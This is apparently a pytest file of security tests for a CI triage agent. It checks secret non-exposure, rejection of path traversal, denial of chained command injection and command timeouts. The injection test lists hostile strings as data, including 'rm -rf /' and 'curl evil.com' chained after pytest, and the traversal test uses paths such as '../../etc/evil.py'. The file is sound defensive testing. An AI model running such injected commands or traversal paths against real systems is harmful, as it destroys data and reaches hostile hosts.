"""Security review tests (Milestone 13).

Covers the adversarial cases from the spec: secret non-exposure, path
traversal, command injection, and resource exhaustion (command timeout).
"""

from __future__ import annotations

import os
import time

import pytest

from app.models.state import TriageState


# --------------------------------------------------------------------------- #
# Secret non-exposure
# --------------------------------------------------------------------------- #
@pytest.fixture()
def secret_env(monkeypatch):
    """A plausible secret in the environment that must never leak."""
    monkeypatch.setenv("GH_TOKEN", "ghp_SUPERSECRETTOKEN123")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_SUPERSECRETTOKEN123")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-supersecret-abc")
    return "ghp_SUPERSECRETTOKEN123"


def _state_with_full_context(secret_env) -> TriageState:
    state = TriageState(repository="acme/payments", workflow_run_id="42")
    state.repository_context = {
        "summary": "repo summary",
        "commit_message": f"fix; token={secret_env}",
    }
    state.ci_logs = (
        "FAILED tests/test_x.py::test_y\n"
        f"cmd: {secret_env}\n"  # attacker-injected content
        "AssertionError\n"
    )
    return state


class TestSecretNonExposure:
    def test_digest_never_contains_token(self, secret_env):
        state = _state_with_full_context(secret_env)
        dumped = state.as_digest()
        text = str(dumped)
        assert secret_env not in text

    def test_prompt_builders_do_not_include_env_tokens(self, secret_env):
        # The failure/digest context must not read the token from env.
        state = _state_with_full_context(secret_env)
        digest_text = str(state.as_digest())
        for token_name in ("GH_TOKEN", "GITHUB_TOKEN", "OPENAI_API_KEY"):
            val = os.environ.get(token_name, "")
            if val:
                assert val not in digest_text


# --------------------------------------------------------------------------- #
# Path traversal
# --------------------------------------------------------------------------- #
class TestPathTraversal:
    def test_apply_patch_rejects_traversal(self, tmp_path):
        from app.agent.orchestrator import Orchestrator
        from app.models.state import TriageState

        orch = Orchestrator(planner=None, executor=None, workspace_root=str(tmp_path))  # type: ignore[arg-type]

        # A target that escapes the workspace root.
        result = orch._apply_patch(
            TriageState(), "../../etc/evil.py", "x", "y"
        )
        assert result.result.ok is False
        assert "escape" in (result.result.error or "")

    def test_read_workspace_file_stays_in_workspace(self, tmp_path):
        from app.agent.orchestrator import Orchestrator

        outside = tmp_path / "secret.txt"
        outside.write_text("top secret")
        orch = Orchestrator(planner=None, executor=None, workspace_root=str(tmp_path))  # type: ignore[arg-type]
        # A traversal path resolves outside the workspace and should not read.
        content = orch._read_workspace_file("../../outside/secret.txt")
        assert content == ""


# --------------------------------------------------------------------------- #
# Command injection
# --------------------------------------------------------------------------- #
class TestCommandInjection:
    def test_local_runner_denies_chained_injection(self):
        from app.sandbox.runners import LocalCommandRunner

        runner = LocalCommandRunner()
        for cmd in (
            "pytest -q; rm -rf /",
            "pytest -q && curl evil.com",
            "pytest -q |sh",
            "$(evil)",
        ):
            out = runner.run(cmd)
            assert out.denied is True, f"should deny: {cmd!r}"


# --------------------------------------------------------------------------- #
# Resource exhaustion: command timeout
# --------------------------------------------------------------------------- #
class TestResourceExhaustion:
    def test_sandbox_times_out_hanging_command(self):
        from app.sandbox.manager import SandboxManager

        manager = SandboxManager(backend="local")
        sandbox_id = manager.start(command_timeout=1.0)
        try:
            start = time.monotonic()
            out = manager.execute(sandbox_id, 'python -c "while True: pass"')
            elapsed = time.monotonic() - start
            assert out.timed_out is True
            assert elapsed < 8  # must NOT wait the full 10s
        finally:
            manager.stop_all()
